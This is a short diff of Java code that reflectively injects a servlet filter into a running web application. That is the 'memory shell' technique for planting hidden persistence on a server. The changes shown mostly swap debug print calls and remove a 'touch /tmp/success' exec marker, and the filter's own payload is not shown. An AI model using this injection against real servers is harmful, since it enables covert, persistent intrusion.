@@ -51,7 +51,7 @@ private static synchronized void GetWebContent() throws Exception{
             }
         }
         ServletContext servletContext = currentThreadsIExtendedRequest.getServletContext();
-        out.println("Step 1");
+        System.out.println("Step 1");
 
         context = (WebAppImpl)GetField(servletContext,"context");
     }catch (Exception e){
@@ -112,7 +112,7 @@ private static synchronized void InjectFilter() throws Exception {
             _filterWrappers.put(filterName,filterInstanceWrapper);
 
             SetField(filterManager,"_filtersDefined",true);
-            out.println("123");
+            System.out.println("123");
 
         }
     }catch (Exception e){
@@ -143,7 +143,7 @@ try {
     GetWebContent();
     out.println("*********************************InjectFilter()*********************************");
     InjectFilter();
-    Runtime.getRuntime().exec("touch /tmp/success");
+    out.println("*********************************InjectFilter Success()*********************************");
 } catch (Exception e) {
     e.printStackTrace();
     out.println(e);
